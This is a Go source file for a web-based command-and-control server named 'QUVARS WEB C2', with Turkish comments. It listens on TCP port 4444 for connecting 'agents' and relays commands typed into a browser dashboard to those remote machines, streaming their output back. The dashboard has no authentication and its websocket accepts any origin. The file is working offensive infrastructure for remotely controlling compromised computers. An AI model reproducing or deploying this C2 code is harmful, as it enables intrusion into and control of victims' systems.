package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"

	"github.com/gorilla/websocket"
)

// İstemci Yapısı
type Client struct {
	ID   string   `json:"id"`
	Conn net.Conn `json:"-"`
	Info string   `json:"info"`
}

var (
	clients  = make(map[string]*Client)
	mu       sync.Mutex
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	// Web arayüzüne bağlı olan admin (sen)
	webConn *websocket.Conn
)

func main() {
	// 1. Agent'ları Dinleyen TCP (Port 4444)
	go startTCPServer()

	// 2. Web Dashboard (Port 8080)
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "index.html")
	})
	http.HandleFunc("/ws", handleWebSocket)

	fmt.Println("\n" + strings.Repeat("=", 40))
	fmt.Println("[+] QUVARS WEB C2 AKTIF!")
	fmt.Println("[*] Agent Port: 4444")
	fmt.Println("[*] Dashboard: http://localhost:8080")
	fmt.Println(strings.Repeat("=", 40))

	http.ListenAndServe(":8080", nil)
}

func startTCPServer() {
	listener, _ := net.Listen("tcp", "0.0.0.0:4444")
	counter := 1
	for {
		conn, _ := listener.Accept()
		go handleAgentConnection(conn, counter)
		counter++
	}
}

func handleAgentConnection(conn net.Conn, idNum int) {
	reader := bufio.NewReader(conn)
	info, _ := reader.ReadString('\n')
	id := fmt.Sprintf("%d", idNum)

	client := &Client{ID: id, Conn: conn, Info: strings.TrimSpace(info)}
	
	mu.Lock()
	clients[id] = client
	mu.Unlock()

	sendToWeb(map[string]interface{}{"type": "new_client", "id": id, "info": client.Info})
	updateClientList()

	// Agent'tan gelen her türlü çıktıyı dinle
	for {
		buffer := make([]byte, 32768) // 32KB Buffer
		n, err := conn.Read(buffer)
		if err != nil {
			break
		}
		
		// Gelen veriyi Web Shell'ine yolla
		sendToWeb(map[string]interface{}{
			"type": "output",
			"id":   id,
			"data": string(buffer[:n]),
		})
	}

	mu.Lock(); delete(clients, id); mu.Unlock()
	updateClientList()
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, _ := upgrader.Upgrade(w, r, nil)
	webConn = ws
	defer ws.Close()

	// Sayfa açıldığında mevcut listeyi yolla
	updateClientList()

	for {
		_, msg, err := ws.ReadMessage()
		if err != nil { break }

		var data map[string]string
		json.Unmarshal(msg, &data)

		mu.Lock()
		target, ok := clients[data["id"]]
		mu.Unlock()

		if ok {
			target.Conn.Write([]byte(data["command"] + "\n"))
		}
	}
}

func sendToWeb(data interface{}) {
	if webConn != nil {
		msg, _ := json.Marshal(data)
		webConn.WriteMessage(websocket.TextMessage, msg)
	}
}

func updateClientList() {
	mu.Lock()
	var list []map[string]string
	for id, c := range clients {
		list = append(list, map[string]string{"id": id, "info": c.Info})
	}
	mu.Unlock()
	sendToWeb(map[string]interface{}{"type": "list", "data": list})
}